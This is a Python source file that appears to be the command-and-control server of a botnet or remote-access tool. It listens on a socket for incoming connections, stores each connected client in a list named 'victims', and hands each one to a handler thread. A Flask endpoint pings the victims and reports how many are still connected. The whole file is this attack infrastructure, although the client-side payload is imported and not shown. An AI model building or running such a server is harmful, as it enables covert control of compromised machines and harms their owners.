from flask import jsonify
from utils.connection_types import Client
import socket
from sys import argv
from utils import logger
from threading import Thread
from utils.api_types import export_app

victims = list()

app = export_app()


@app.route('/victims')
def get_victims():
    global victims
    checked = list()

    for client in victims:
        try:
            client.conn.send('CHECK'.encode('utf-8'))
            checked.append(client)
        except:
            continue

    victims = checked

    return jsonify({
        'TOTAL SIZE': len(victims)
    })


api = Thread(target=app.run, name="API Handler 1", daemon=True,
             kwargs={'host': '0.0.0.0', 'port': 9001})

api.start()

if argv[1] == '--dev':
    HOST, PORT = 'localhost', 9090
if argv[1] == '--prod':
    HOST, PORT = '0.0.0.0', 9002

### SOCKET BINDING ###
sock = socket.socket()
sock.bind((HOST, PORT))

sock.listen(5)

client_id = int()

logger.warning('DADDY STARTED ', HOST, ':', PORT)

while 'LISTENING':
    conn, addr = sock.accept()
    client_id += 1

    logger.info('CONNECTED: ', addr)

    client = Client(conn, client_id)
    victims.append(client)

    handler = Thread(target=client.loop,
                     name=f"CLIENT {client_id} HANDLER")

    handler.start()

sock.close()
